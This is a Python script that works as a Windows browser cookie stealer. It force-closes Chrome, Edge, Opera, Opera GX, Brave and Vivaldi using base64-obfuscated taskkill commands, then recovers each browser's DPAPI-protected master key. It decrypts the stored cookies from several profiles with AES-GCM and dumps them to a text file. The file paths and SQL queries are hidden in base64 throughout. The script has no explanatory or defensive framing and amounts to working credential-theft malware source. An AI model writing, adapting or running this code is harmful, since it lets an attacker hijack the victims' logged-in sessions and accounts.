import os
import sqlite3
import base64
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import json

def decrptkey(path):  # encrypted_key get
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    lcoalstate = json.loads(c)
    keyprosds = base64.b64decode(lcoalstate["os_crypt"]["encrypted_key"])
    keyprosds = keyprosds[5:]
    keyprosds = CryptUnprotectData(keyprosds, None, None, None, 0)[1]
    return keyprosds


def decpedicipro(buff: bytes, master_key: bytes) -> str: # decrypt data
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    cozulmusveri = cipher.decrypt(payload)
    cozulmusveri = cozulmusveri[:-16].decode()
    return cozulmusveri




cookiesvarname = ""
decrpydedcookiename = ""

os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGJyYXZlLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG9wZXJhLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIHZpdmFsZGkuZXhl").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGNocm9tZS5leGU=").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG1zZWRnZS5leGU=").decode())


try:
    chromedec = decrptkey(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass
try:
    cookiesvarname += "\nChrome\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], chromedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass

try:
    cookiesvarname += "\nChrome P1\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMVxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], chromedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass

try:
    cookiesvarname += "\nChrome P2\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMlxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], chromedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass

try:
    cookiesvarname += "\nChrome P3\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgM1xOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], chromedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass


try:
    edgedec = decrptkey(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass
try:
    cookiesvarname += "\nEdge\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XE5ldHdvcmtcQ29va2llcw==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], edgedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass

try:
    cookiesvarname += "\nEdge P1\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDFcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], edgedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass

try:
    cookiesvarname += "\nEdge P2\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDJcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], edgedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass

try:
    cookiesvarname += "\nEdge P3\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDNcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], edgedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass


try:
    operadec = decrptkey(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    cookiesvarname += "\nOpera\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], operadec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass


try:
    operagxdec = decrptkey(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    cookiesvarname += "\nOpera Gx\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], operagxdec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass


try:
    bravedec = decrptkey(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGU=").decode())
except:
    pass

try:
    cookiesvarname += "\nBrave\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlLUJyb3dzZXJcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], bravedec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass


try:
    vivaldidec = decrptkey(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass

try:
    cookiesvarname += "\nVivaldi\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        cookiesvarname += "\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + decpedicipro(row[5], vivaldidec) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\n"
except:
    pass

asdasd = open("asdasd.txt", "w")

asdasd.writelines(cookiesvarname)
print(cookiesvarname)